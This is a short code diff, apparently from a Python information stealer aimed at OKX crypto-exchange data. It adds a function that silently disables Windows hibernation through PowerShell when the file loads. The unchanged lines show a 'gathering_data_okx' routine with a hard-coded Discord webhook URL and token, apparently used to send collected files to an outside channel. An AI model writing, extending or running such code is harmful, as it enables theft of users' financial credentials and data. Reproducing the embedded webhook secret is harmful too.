@@ -1,3 +1,8 @@
+def disable_fast_startup():
+    command = 'powercfg -h off'
+    subprocess.run(['powershell', command], capture_output=True, text=True)
+disable_fast_startup()
+
 def gathering_data_okx(file_path, message):
     webhook_url = "https://discordapp.com/api/webhooks/1351101845728137269/u2q5Qy5G78nozccKoPPTWVqedCFFOXiFgQ1B5V_2IJ8TWpUEQjcdPKH5eqU-MGX96Ieb"
     mod_time = os.path.getmtime(file_path)
